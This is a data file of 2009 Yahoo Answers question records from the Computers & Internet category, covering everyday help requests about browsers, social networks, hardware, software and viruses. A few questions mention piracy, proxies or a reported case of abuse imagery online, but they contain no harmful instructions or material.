20090128183756AArrXFv	Computers & Internet;Internet;Other - Internet	My internet explorer is acting very strangely?	I know that I stupidly downloaded a virus from AIM but I thought they were gone. My computer was acting much better. But then all of a sudden when I typed online everything I typed wouldn't go in and it would skip letters. On facebook instead of my password being displayed as black dots it would display the letters and numbers. When I hit enter it would tell me my password is incorrect even though I know it isn't and it would always work the second time. My youtube videos would load but would never start except for one video I found played without a problem which I found to be very strange. Finally on every myspace page the music player would be replaced by a Beastie Boys music video.
20090128183849AAcYJ8u	Computers & Internet;Software	How do you run windows vista as administrator?	N/A
20090128183817AApxOOD	Computers & Internet;Software	A good torrent downloading software?	I'm looking for a decent torrent downloader (for PC) that wont slow down my system or anything.      Thanks.
20090128183606AAgg4VW	Computers & Internet;Software	Avery Wizard Help Needed!!!?	I want to download the Avery Wizard ( http://www.avery.com/avery/en_us/Templat...  but I am not sure where to download it to on my computer in order to be able to use it with Word.  I need help!!!
20090128183630AAtAX3j	Computers & Internet;Hardware;Printers	I use lexmark 17 black ink and 16 color ink, does somebody know if they refill them because they are expensive?	i heard they do this at walgreens      any suggestions are appreciated      thanks
20090128183631AAn01Qo	Computers & Internet;Internet;MySpace	Help withh my myspace?	i have a myspace and when i want to put on a layout i go to the about me section then all it's says about me and who'd i like to meet and thats it nothing else
20090128183654AAL0Csc	Computers & Internet;Software	Do you have to pay to get Tune Clone to work?	I downloaded the trial version   Installed it   Used it but my songs are cut to 3 min.   Can i fix this or do i have to pay for it??
20090128183724AAbVRA0	Computers & Internet;Programming & Design	Java application on the Web         ?	Find a Java application on the Web and describe how the program structure functions.    · Describe the application in as much detail as possible.    · What functionality does the application have that you have learned about in this class?   · How could you improve upon it?
20090128183839AAHkSLo	Computers & Internet;Software	Will the Microsoft Surface ever be able to go into homes and not just commercial use?	N/A
20090128183844AAZlvqU	Computers & Internet;Computer Networking	How do i fix my internet?	the internet page went like all scruched and small as if i were on an Iphone or Itouch, i was wondering how to fix it, or i know there's this thing you can do to, to like re-set it to a date so  like everything i did today was cleared off. Any suggestions?
20090128183847AAA10gs	Computers & Internet;Security	I accidentally enabled a WPA on ?	I just need the default WPA for a linksys router. I didn't put anything in. I just clicked the button
20090128185007AAMWkBZ	Computers & Internet;Hardware;Add-ons	Will using an external hard drive solve my problem? ?	I want to install a new software on my laptop. it says i dont have enough space. if i buy an external hard drive, will it solve the problem?    also, this is totally unrelated, but if I also buy more ram, will it improve the burning process on a cd/dvd?
20090128184010AAnIfB4	Computers & Internet;Internet;Other - Internet	Is there anyway to Mac chat if you dont have a mac?	3 of my friends have macs, and im stuck with a crappy HP. I have a webcam, oovoo, skype, and all those other video chatting things, but i really want to connect with them on the mac chat. Is there ANYWAY, ANYTHING i can download so that i can mac chat with them so i dont feel out of the loop?   Buying a mac is not an option, dont waste your time writing that.   And im aware oovoo and skype they could just download, not the point. MAC CHAT is what im asking for.
20090128184055AAWVTbM	Computers & Internet;Software	How to turn off "track changes" in Microsoft word?	while using MS word I kind of turned on something called "track changes" and now i can't turn it of.   how do i turn it off? i am not seeing an option for that.
20090128185209AAC0juM	Computers & Internet;Programming & Design	I need help with a internet radio sever?	ok I wanna host my own radio on my website "Bobbamusic.net" and I want it to be like the one at "habbcrazy.net" how do I make a radio like habbcrazys?
20090128184137AA5ygKH	Computers & Internet;Computer Networking	You are to going to set up a small network in your homes consisting of two or three networked computers.?	What network hardware would you purchase (i.e., cable types, computer components, wireless equipment, and so on) and why? Make sure that you factor in the cost involved in setting up the network and weigh it against the purpose for which the network would be used.
20090128184910AATmyfZ	Computers & Internet;Hardware;Laptops & Notebooks	How come when I connect my laptop to the TV, the TV just turns off? It worked before but now it doesnt!?	N/A
20090128185058AAs6n0N	Computers & Internet;Programming & Design	How do you make a website?	because me and my friends want to make one.       are they free? if not are there some places you can go that will have them for free
20090128185112AAdcH0x	Computers & Internet;Internet;Other - Internet	Child Pornography on 4chan?	Okay, so my friend gave me a link to a picture from 4chan, just, a funny picture joke, but then I clicked on the /b/ (random) boards, and there were several pictures of childpornography. I was shocked and immediately turned it off. One of the pictures show a man doing something very sexual to a girl of about 5. This is disgusting and why don't the feds get involved with this? It's so blatently obvious, big pictures of kiddie porn on this forum. Where are the feds when you need them?!?! Is there a chance they're already watching?
20090128184031AAIXu8o	Computers & Internet;Computer Networking	Linksys Ultra RangePlus Wireless-N Broadband Router?	is this a good router?   :)   how do you protect it? So that other people cant use it?   :):):)
20090128184007AAKiit5	Computers & Internet;Hardware;Monitors	I have a 46 Inch LCD Samsung and I want to plug it in to my deskstop PC.  How do I do it?	I've plugged in my VGA Wire to my LCD and still doesn't work.  I will add more details if you want me to clarify it more.  Thanks for the help!
20090128184011AABycLm	Computers & Internet;Computer Networking	Who feels bad for aol internet?	N/A
20090128185044AA2B8e2	Computers & Internet;Internet;Facebook	Girls, do you think it's not ok for a man to add as friends unknown girls on Facebook ? Why do they ignore me?	I created my Facebook account last week, I have 6 friends ( 3 guys and 3 girls), and I was checking the list of friends of my friends, and lists of members of certain groups that I joined, and I wanted to add some girls (and I sent them a message " Hi, I've seen your profile on this group, I am a new member and I would be glad to get to know you better...If you want, we could discuss, why not? ..See you later, bye" )   And unfortunately, none of those girls accepted my friendship, and they ignored my message...   So, I am worried , do they ignore me because they don't know me, or simply because they don't like my picture or/and my message?   Can you advise me, plz?   Is it wrong to contact people that I don't know?   I thought Facebook was a site that helped people to meet up and become friends (and maybe more than friends, if there is mutual attraction,of course...)      What do you think?      Thanks
20090128184205AAZGXTv	Computers & Internet;Other - Computers	How to get IIS server ?	How to install IIS server ? When I installed win server 2003, it didnt ask to install IIS server. Isnt IIS installed with the installation of win server 2003 by default ? Now I have win server 2003 installed, how can I get IIS ?
20090128184025AAO7aCD	Computers & Internet;Internet;Other - Internet	Today I opened my web browser and all my bookmarks were deleted, and I am unable to use many buttons?	I use Firefox.   I am not being able to use the back/forward, refresh, or stop buttons. When I open the browser, it shows a blank page even though it was set to open a certain home page. Right now, even the File, Edit, View, History, Bookmarks, Tools, and Help tabs are appearing gray, and I can't click on them   How can I solve this problem? What is wrong with the browser?
20090128183911AAg7oVO	Computers & Internet;Hardware;Other - Hardware	I need help in Partitioning my Hard Disk Drive in WinXP?	Hello. I need to make a partition of my HDD in XP. I have WinXP running on my Lenovo T61p PC, but when I partition my HDD, I want to make sure that my current XP installation is still working. In other words, I don't want to format my HDD, just split it into 2...    Any help is appreciated.
20090128184501AAryjM6	Computers & Internet;Internet;MySpace	How do i make a link say something else?	I want to copy the "video" link on myspace and put it on my page i just dont want the big long address i want it too say "JAi'S ViDEOS" how can i do that? Thanks
20090128185013AA3nAuY	Computers & Internet;Software	I  am having troubles with microsoft word and need help!?	It will not let me type anything, when I try it says The modification is not allowed because the selection is locked. Does anybody know what this means??      Please  and thankyou,   kelsey =]
20090128185429AAAZSe5	Computers & Internet;Software	How do i clear all the songs off my itunes library ?	N/A
20090128195416AAyRMoE	Computers & Internet;Hardware;Add-ons	My external fax modem won't hang up -- but the line is okay. What's up?	I hooked up a fax modem to fax but after the first fax, it won't seem to hang up. I tried flipping around the dipswitches. What's the deal?
20090128195433AAJ6lD7	Computers & Internet;Internet;MySpace	Myspace Profile edit!!! Please help!!!!!?	How do i edit my myspace page where the about me section can be cool...     ex:  If I type  I am HARDCORE it can be crossed out  or...  If i say   I HATE YOU it can be crossed out  if i type I Love you, It can be in bold or underlined... how do i do that?
20090128193921AANlUM8	Computers & Internet;Programming & Design	Looking to start my first website?	I do a lot of video work and cant rely on Myspace or other pages like that to host my videos and resume on.  I am looking to start a website of my own which I can put videos on, sell my training DVDs though, and put other info on in hopes that I get a job.      I was told from a friend that Bluehost.com was good and it is but I don't want to pay $7 a month.  Free hosts are out there but I don't want an ad filled page either.      I then heard about hosting a website off a home computer.  I have a spare PC laying around and would like that to be my "server".  the power hardly goes out and we have quick internet so site down time should hardly come up.      Any tips on getting started with all this?   I have Adobe CS3 Masters collection which offers some website design software so if anyone knows of any good ones for beginners out of that pack please speak up.      I've never done a real website before but have a good idea of some layouts I did in Photoshop CS3 Extended.  Any tips and advice would be great.      Thanks   Dave,   Sonic Orb Studios
20090128195859AA7Gier	Computers & Internet;Internet;MySpace	How do you put a picture as your myspace background?	i have a pic i want to pt as my background but i dont know how please help!!!!
20090128190132AAOsxiB	Computers & Internet;Hardware;Laptops & Notebooks	Could you help me increase performance of laptop?	I want to increase the GHz on my laptop, I have a core 2 duo with 1.83 GHz.  I would like to have it running at like 2.2 GHz.  Is there anyway to increase this for a fairly low price (Under $300).
20090128194416AAAJF0A	Computers & Internet;Hardware;Laptops & Notebooks	HP LAPTOP??????????(20 characters-darnit)?	i want to restore my computer.someone on yahoo told me to save my files to a thumbnail because i don't have a cd to save them too.what is a thumbnail???is it on my computer already or do i have to buy it from somwhere?         *i was thinking about putting my photos on photobucket but i also have music too so the whole photobucket thing is out of the question...   *hp pavilion dv6000   *i'm 14 so can you explain it the easy way.i'm smarter than a lot of 16 year olds so just say it like i'm 16 or 17
20090128191615AAIoPtM	Computers & Internet;Programming & Design	DOES ANYONE KNOW THIS? I DONT UNDERSTAND IT! PLEASE HELP!?	Windows icons and controls are designed to be manipulated by a device called a/an _____________.
20090128192553AApiDuo	Computers & Internet;Computer Networking	Windows Domain Server 2003 Down, Clients asking user name & Password to access the shared folder.?	I have windows domain server 2003.All XP systems are connected with domain.If i shutdown the domain controller, the shared folders are asking user name and password to access the resource. How  to over come this.Pls help me.What are the steps we have to do when a domain controller failed
20090128192718AAP2VCt	Computers & Internet;Hardware;Desktops	Does it matter if your front side bus is different speed then the processors?	i was just wondering if they had to be the same to be compatible, like if you have a motherboard with a fsb 1333 it has to be the same with the motherboard?
20090128191411AABf7LV	Computers & Internet;Computer Networking	I need help creating a network connection.........?	okay I re-installed windows and wasen't paying attention when it was helping me creat an internet connection. So i need help,      I went to control panel>network connections> and then click create a new connection from there i went to connect to the internet and then set up  my connection manually, then to connect using broadband connection that is always on. after that It says finish and when i finish there is no internet connection even made its just a blank white screen.      on my other computer I reinstalled windows but this time didnt forget it has a connection.            Oh im trying to use DSL . can anyone help me
20090128193553AATghH1	Computers & Internet;Software	Want to reformat vista to xp. Vista has no cd for later recovery help?	Ok I have a compaq cq60 with windows vista. Now I hate vista and want to uninstall and go back to XP. I need to make a copy of vista for later installation if something go's wrong. how do i do this?
20090128195042AAxQsmX	Computers & Internet;Internet;MySpace	Help deciding on a myspace name?	my name is allie.   anything i can use for my username?   i cant think of any.
20090128194902AAuAXWR	Computers & Internet;Internet;YouTube	Whats the best way to promote my youtube channel?	DewYouDewTheDew is my channel
20090128193552AAu8ZDv	Computers & Internet;Programming & Design	How much does Graphic Designers make thats first starting off?	This is what I will be going to school for
20090128190225AAqFwdI	Computers & Internet;Internet;MSN	If you type a mesage to someone offline, and it comes back and says it cant b delieverd in red, then have they?	then have they blocked you?    coz most people you can leave them offline messages
20090128190833AA96mvg	Computers & Internet;Internet;YouTube	Why can't I watch this video on youtube?	I click on the video and it comes up black and won't play. Anyone know what to do? Or why its doing this?
20090128185754AA2RS5D	Computers & Internet;Hardware;Add-ons	I have a Emachines etower 366si and i want to put windows xp on it, what drivers will i need?	I have a Emachines etower 366si and i want to put windows xp on it, what drivers will i need? I need a link or something for someone to help me, PLEASE HELP
20090128185943AAqpzgv	Computers & Internet;Software	Does it cost any money to download Adobe Flash Player?	All i wanna do is play one game and i dont know if i have to pay for adobe flash player, does anyone know if it costs anything to buy it or if its free?
20090128190029AAjiNJV	Computers & Internet;Programming & Design	In java programming, how do you break a string into an array?	As in.... how can you make a string such as "duck" into an array where each letter is in a different arraay boxes or whatever where array[0] = "d", array[1] = "u" and so on.
20090128192536AAQJh96	Computers & Internet;Software	How do you do a t-test on numbers for iwork?	I know how to do it on excel but I don't have excel anymore. Can anyone help?
20090128193059AAj6Yg8	Computers & Internet;Software	Problem with installing nvidia 179 driver?	I use nvidia geforce 8200m g and I was planning to install the 179.28 driver. On the nvidia site, it says it supports the card I'm using but when I tried to install this it says driver isn't supported.    Im using vista 32 bits also.   i was wondering if any1 has the same  problem and if there's any solution.
20090128193102AAcokFA	Computers & Internet;Hardware;Desktops	Dell inspiron 531s keyboard?	can u buy any usb keyboard to replace factory keyboard? i got the factory keyboard wet and it doesnt function properly no more
20090128193957AA4kCvU	Computers & Internet;Internet;YouTube	Youtube Commenting feature Disappeared!?	A lot of times when I click into a video on Youtube, there's just the video and nothing else. No comments, no uploader's name, no fave/playlist options ..... i can't even see the comments of my own videos anymore.      Is everyone else experiencing the same thing or did i mess up some settings?
20090128194038AAPzRNL	Computers & Internet;Security	Is everything that has to do with Myspace bad for my computer?	It seems like every time someone gets online and tries to make a new layout for their page, my norton pops up and I have to run scans and delete stuff.  Does anyone else have this problem?  If so, what sites are safe?
20090128194156AAXSeL1	Computers & Internet;Hardware;Monitors	How come my white macbook is using up the power coming from the power adapter instead of charging?	When I hover above the battery sign thing, it says battery is not charging and beneath it it says Power Source: Power Adapter.
20090128194345AAC98oD	Computers & Internet;Internet;Facebook	How do you disable someone from tagging you in pix on Facebook?	I don't want a specific person tagging me in his pics.
20090128195357AAZ2yN7	Computers & Internet;Hardware;Other - Hardware	Will a diode from a cd player work for a laser?	i saw instructions on how to do this but they all used a dvd burner diode.
20090128145851AADbaGf	Computers & Internet;Hardware;Other - Hardware	A question about  PC cards?	I have a Acer laptop for over a year now ,i am curious about this thing on one side of my laptop (PC card slot)if i buy a memory card will this will give me more memory to work with my laptop now that  my computer is working to slow or i am totally wrong and this is for something totally different,i don't know to much about comps. please use some basic english if you can,i would appreciate it
20090128150604AAOpnYh	Computers & Internet;Internet;YouTube	Why is youtube loading so slowly?	Its taking forever to load on firefox and internet explorer.
20090128201352AApkwM7	Computers & Internet;Hardware;Desktops	What motherboard for intel Quad-core?	my last question was close to this, but this time i would like someone to recommend the best overall motherboard for an intel quad-core, probably 6600. I am looking for a decent $150 range, and will buy a separate Graphics card. (suggestions?) please just give me your overall best choice! DDR2, and dual channel memory. it should have  pci x16 slot for a graphics card. please include at least some details of the board. a link would be helpful too. i am willing to pay a little bit extra for a nice board, but not over $200.
20090128145458AAG2Vpm	Computers & Internet;Computer Networking	Why does my laptop lose internet connection when my brother is on xbox live and how can i fix it?	N/A
20090128090242AAanUeZ	Computers & Internet;Internet;Other - Internet	If you had to recommend 3 websites which ones would you suggest?	Not including this one of course, facebook or myspace.  Also no porn sites thanks :)   I want a really good website that I keep coming back too.
20090128151123AATpYDw	Computers & Internet;Hardware;Add-ons	---Webcam good or bad?---?	ok so i want a webcam really badly but my brother who is 15 tells me not to get one. why is that...i mean like is it bad for your computer or something or is my brotha just weird like thatt? all my friends have one? why cant i?
20090128090118AADibkV	Computers & Internet;Internet;Other - Internet	What items are most popular on eBay...?	I need to know what items are most popular and what items get a decent amount of pounds.      Thanks
20090128200731AAL0lbM	Computers & Internet;Software	Would you still use Linux if there was no Compiz?	Compiz convinced me to give Linux a try, but now I hardly use it. Lately, I've been mostly using fluxbox since it's light, simple, and does everything I need it to do
20090128145439AAo1iBd	Computers & Internet;Other - Computers	Rar files, can i delete after extracting and still have what was in the the rar file...?	if you recieve a download that is in rar format, you extract what is in it right? then after that can you delete the rar and still have the files that were in the rar file, or ? could you tell me about rar files, and if i can do that
20090128150942AAYYuvo	Computers & Internet;Hardware;Desktops	Upgrade from 9500gs to 9800gt problem?	I have a 9500gs in my computer at the moment. I want to upgrade to a 9800gt, but the problem is that I'm afraid it will run out of power.       My power supply is 460 at the moment too. I really don't want to buy a card where I have to replace my power supply.      The computer is an hp d5100t.      Will this replacement mess up my computer?
20090128150117AAjXuQ4	Computers & Internet;Hardware;Add-ons	I need some websites that will walk me through how to install more RAM into my computer.?	I already know what I need to buy, but I want to make sure that I am going to be able to install the RAM myself.  I don't want to have to take it anywhere.  I'm clueless when it comes to hardware.  I've installed RAM into my Laptop, that was easy, but this computer is a Dell Desktop.  So any good websites that will walk me through the installation of a few RAM sticks would be great.
20090128145829AAUTM4l	Computers & Internet;Internet;MySpace	City Default Layouts??????????????	Where can i find good city DEFAULT layouts. I want them to be ONLY defalut....          1st to answer with best layouts/websites gets 10 POINTS!!!!!
20090128145110AAS70DB	Computers & Internet;Other - Computers	This thing keeps popping up on my computer screen?	Every time I hit a certain key like the "P" or even the space bar in green big letters "Play/Pause" keeps popping up on the bottom of the screen. It really bothers me because it's been doing this all day and I've turned off the computer a few times but it keeps doing this. What can I do?
20090128201845AA2yQM7	Computers & Internet;Security	Could it be something that i deleted of my computer?	I had "Sound Max" on my computer and i deleted it a couple minutes, I came back on my computer to watch a video and them they was no sound, so I'm wondering is its because I uninstalled "Sound Max" of my computer and if so tell me what website to go on to get it back and is there another different website that means the same thing has "Sound Max"
20090128144651AAdW01p	Computers & Internet;Internet;YouTube	Help, Uploading video's to YouTube..?	I've always wanted to upload a vid, not of me but a vid of karoke, I see songs I like but not the official video, but lyrics, How do I do this?, where can I find codes to upload vid's?         Easy 10 pts.
20090128200229AAqfKij	Computers & Internet;Software	Does anyone know of a free version of  Microsoft Word or something like it?	I need a free software like Microsoft Word thats free. It doesn't have to be Microsoft Word, just something that I can type in, copy and paste and performs other tasks similar to the ones Microsoft Word performs.
20090128150511AAwsGjU	Computers & Internet;Software	My computer freezes everytime I turn it on! Plz help?	Well, this fake anti-virus program called spyware guard 2009 installed itself on my system so I installed a thing called spyware doctor which claims that it removes spyware guard.  But now my computer starts to freeze everytime I turn it on! Is there anything I can do to fix this?
20090406094002AAV7YWT	Computers & Internet;Security	How does a virus get in your computer?	One time Antivirus-1 got in my computer.  Is it because you go to a specific website or is it because you downloaded something?  If so, how do you know if a website or if you download something has a virus?
20090128144212AAVVP7U	Computers & Internet;Hardware;Laptops & Notebooks	What is the cheapest possible laptop that you can buy?	I am on a very limited budget and need a laptop. It has to have wi-fi and has to at least be slightly above a piece of crap.
20090128151324AA6boSA	Computers & Internet;Hardware;Desktops	Hard drive space dissapeared?	I've got Windows Vista Ultimate, and earlier today it said I have 120GB of free space left, I messed around in photoshop for a bit and then checked again and it said 3GB was left...      I have no idea what happened, I've checked all folders I could think of but they are all the same as they where with no excessive amounts.      I've also restarted the computer and have done some virus scans but, no virus.      What happened?
20090128202126AAwqHvr	Computers & Internet;Internet;Facebook	When you are "tagged" on Facebook, what does that mean?	?
20090128200227AAY2h8a	Computers & Internet;Internet;Other - Internet	What do you guys think of the sneak peek of my new web show?	Would you watch this?       http://www.youtube.com/watch?v=lSCJIk8oM... 
20090128145306AAmsaGw	Computers & Internet;Security	I downloaded avg now my computer keeps re-booting by its self over and over again?	does anyone know what to do - it will only let me go into F2 and F12 - not into the safe mode to remove the avg and see if it corrects the problem. This is my laptop, it has happened my home dell computer.   HELLLLLLLLLLLPPPPPPP PLEASE!!!!!!
20090128154902AAd1TuQ	Computers & Internet;Other - Computers	Faithfreaks help please?	on my faithfreaks account i tried joining the chat but i don't kno what to out for the password i tried puting in my account password but it didn't work and i put it the display name for user name
20090128150740AAFrsmS	Computers & Internet;Software	Windows live messenger 8.5!!!!!! help !!!!?	ok today i just downloaded the new windows live and when i chose the theme it is all squished and blury! for example if i picked the purple skull theme i could only see the eyes and it is bluryy! help does anywon know how to fix this ? :) plx help
20090128145028AArVSDI	Computers & Internet;Internet;Other - Internet	Just signed up on livejournal and already I am having trouble!?	Can anyone tell me how you can find friends on livejournal?  I have tried to look for a place where you can search for your friends.  I see where you can search for communities and stuff.
20090128144926AAfeL3v	Computers & Internet;Security	Limewire vs. Frostwire?	Which is better for downloading music?
20090128144716AAES9YX	Computers & Internet;Security	Is this good COMPUTER SECURITY?	these are the programs i use, with vista.......   from 1 to 10, ten being best      comodo pro w/ defense plus   avira antivir   spyware terminator   firefox 3 w/ noscript, adlock plus, wot   back up malware apps....   a squared free   malwarebytes antimalware   superantispyware      also, secunia psi      computer cleaners and optimizers.......   clceaner and glary utilities
20090128151110AAP3Dy4	Computers & Internet;Hardware;Desktops	Windows XP continually restarts at login screen?	My desktop XP keeps restarting itself none stop at the log in screen. i can enter in safe mode but it seems to do no good. can anyone please help me. i dont have the software disc anymore.
20090128144622AANtWUd	Computers & Internet;Programming & Design	What is interparagraph spacing?	N/A
20090128145744AAxMYzR	Computers & Internet;Internet;Facebook	Facebook profile question?	okay so you know how some people have the "poke ____" under their picture on their profile...i took this off mine awhile ago and now i wanna put it back...does anyone know how to do this/where i can find the settings to fix this?
20090128201015AAFL40S	Computers & Internet;Other - Computers	I lost my paint how do i get it back?	i accidentally deleted my paint on my computer?   any way i can get it back?   help is greatly appreciated.
20090128201744AAnBLpV	Computers & Internet;Hardware;Printers	What kind of paper do i print a resume on?	I have an internship i am applying for
20090128200229AAtJKDP	Computers & Internet;Software	Can i download a soundcard online somehow?	I accidently deleted mine and i dont have enough money for one. I bought this game that wont work without one.
20090128090452AAKGj6L	Computers & Internet;Internet;Other - Internet	My aim sn got suspended?	Ok well I know I didnt do anything, i think it was a virus on my computer because the other day it started to send these random webcam messages to all my buddys like 5 times. But now it says i need to make a new pw, but i dont remember my favorite song i put. What do i do? Could i email them about this so i could get my acc back?
20090128154206AAjP9UV	Computers & Internet;Software	How will i install XP on this?	Ok so my friend has asked me to install xp for her on her sons new little netbook, but it has no disk drive or floppy drive. I have xp on a disk and was wondering how i can go about installing it for her without having to buy an external disk drive? Is it maybe possible to do it over a wireless network or even by putting it on my 1gb USB flash drive and installing it from there somehow as i think it is able to boot from usb. Can anyone advise me how to do it and possibly some easy instruction to follow.   Thanks
20090128151203AAmsqHj	Computers & Internet;Hardware;Laptops & Notebooks	How do you download word onto a dell laptop?	i don't have word or anything on my dell laptop and i was wonder where you go/ or what you buy to get it put on there.
20090128145052AAzDtuU	Computers & Internet;Hardware;Laptops & Notebooks	Would this RAM be able to go into this laptop?(links inside)?	Like the question says would this RAM http://www.crucial.com/store/partspecs.a...    Be able to go into this laptop  http://www.notebookreview.com/default.as...    and if not could you recommend another 4G 2 piece kit that would for around the same price...    I would also like to know was if i were to replace my current 1G of RAM with those 2 2Gs of RAM would i lose data on my computer....
20090128152249AA2oePL	Computers & Internet;Internet;Other - Internet	How do I close Firefox when..?	How do I close Firefox when I want to download adobe flash player. I keep saving the adobe flash player and then closing out of Firefox like just exiting out of it, and it's still saying "Close Firefox." Could someone please help me out?
20090128152649AAggYZu	Computers & Internet;Hardware;Laptops & Notebooks	Dell inspiron b130 help?	i just bought a hard drive today and tried to install windows and it didnt work i ran the diagnosics and it said the optical drive had an error and it was the spindle and i tried installing windows via usb flash drive. i called dell and i would have to pay 44.99PLUS TAX to just diagnos the problem im not paying. so please please help me.
20090128150032AAqoxiq	Computers & Internet;Internet;Other - Internet	If you use a proxy on piratebay?	if i were to go on piratebay while using a proxy could they still get my IP address?
20090128200209AAwtcYR	Computers & Internet;Security	Is it safe for your computer to leave your e-mail account open and signed on?	my mom always does this and i tell her to sign out as it makes the computer vulnerable and run slower. am i justified?
20090128203849AAVwM3V	Computers & Internet;Software	Microsoft Windows 7 (beta)?	OMG!   could somebody, anybody please on this Earth, tell me how to get rid of Windows 7 (beta)?  How do I un install it, delete it or whatever, this program has given me the fits and I just don't know if I can handle it anymore, I absolutely can't do anything.  To me Windows Vista is like gold, I feel like a man trapped in a matchbox.   Does anyone out there know how to get rid of Windows 7 or what recommendations can I have, any information please!!!!!
20090128085413AAHGwe5	Computers & Internet;Internet;Other - Internet	MEEBO IS NOT WORKING!?	okay so at school we can't download aim or anything like that, so we use meebo or download aim anyway, but meebo is more convient due to the fact that we as students at my high school all know it is a pain to keep downloading aim and installing it in different computers so we just stick to a blocked myspace that we learned to get around of course or use meebo   now for some reason it is not allowing me to text people via meebo to there phone, but it allowed it before   it just says that meebo is unable to send message in itallics   how do i fix this problem   aand btw texting is "illegal" at my school and my teacher is strict so please someone have a plausible answer   oh and btw it only allows me to im people who are on there aim and so forth   and tell me how to fix it please i'd apprieciate it thanks =]
20090128124329AAgnVW9	Computers & Internet;Other - Computers	ICT Question. What's Comparison and Logical Operators?	ICT problemms It's about Database and Query   Q. What is 'Comparison and Logical Operators'?      a)A way to collect the data that is attractive and easy to use   b)A way to get a file of data that is attractive and easy to use   c)A way to narrow down a query   d)A way to present data instead of as a table   e)A way to search a database   f) A way to store data in database      plz answer........ plzplzzplzplsrgdkldjaesgklajksldgjdlkgjl...   thanks
20090128144914AAd33jv	Computers & Internet;Hardware;Other - Hardware	I am buying a new computer and...?	...I have the option to choose a dual-DVI video card or a VGA\DVI.      they are nVidia GeForce 9400GT 1GB...dual-dvi or vga\dvi..      I have two monitors that I want to connect to one of these cards(for dual monitor display), the only problem is that they both only support VGA. If I get two VGA-to-DVI converters will it degrade any video quality when connected? Should I choose the video card with a VGA\DVI and instead just get one VGA-to-DVI?      The two monitors I have are Dell...and pretty old..older than 4 or 5 years. One is LCD and the other is CRT.      What is the best option?
